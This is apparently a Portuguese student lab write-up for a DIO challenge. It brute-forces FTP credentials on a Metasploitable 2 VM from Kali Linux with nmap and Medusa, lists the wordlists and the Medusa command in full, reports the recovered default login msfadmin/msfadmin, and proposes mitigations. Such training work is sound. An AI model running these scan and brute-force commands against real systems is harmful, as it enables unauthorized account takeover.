# Desafio-DIO-Simulando-um-Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Desafio de simulação de ataques brute force com Kali Linux


## Cenário e objetivo
1. Criei duas VMs no VirtualBox:
   - **Kali Linux** — atacante
   - **Metasploitable 2.0** — alvo  
2. Rede: **Host-Only** 
3. Objetivo: identificar portas abertas e realizar brute-force com **Medusa** usando wordlists, documentar o processo e propor mitigações.

---

## Passo a passo:

Dentro da Metasploitable executei:
`ifconfig`
e obtive o IP do alvo: `$TARGET` (placeholder, utilizar o IP da máquina alvo no lugar).

No Kali fiz varredura nas portas padrões com:
`nmap -sV -p 21,22,80,445,139 $TARGET`
Identifiquei que a porta **21 (FTP)** estava aberta. Testei conexão manualmente com:
`ftp $TARGET`
O serviço pediu `USER` e `PASSWORD`.

Criei dois arquivos de wordlists chamados `users.txt` e `pass.txt`. Usei os comandos abaixo para gerar os arquivo:

`echo -e "msfadmin\nadmin\nroot" > users.txt`

`echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt`

Após isso, executei o Medusa com o comando:

`medusa -h $TARGET -U users.txt -P pass.txt -M ftp -t 6`

Resultado: o brute-force teve sucesso. Credenciais encontradas:
`USER: msfadmin`
`PASS: msfadmin`

Confirmei o login via FTP com:
`ftp $TARGET`
`# USER: msfadmin`
`# PASS: msfadmin`

E consegui acesso ao login da máquina alvo. 

Recomendações de mitigação :
- aplicar **política de senhas fortes** (TAMANHO X COMPLEXIBILIDADE);
- implementar **bloqueio temporário / rate limiting** após N tentativas falhas para evitar ataques mais simples que usam muitas requisições por user;
- habilitar **MFA** onde possível;
- **desabilitar serviços** desnecessários (portas);
- segmentar rede e aplicar **firewalls** para limitar exposição.

Observações finais: executei tudo em **Host-Only** (ambiente controlado). **NÃO** realizei brute-force em sistemas sem autorização. 
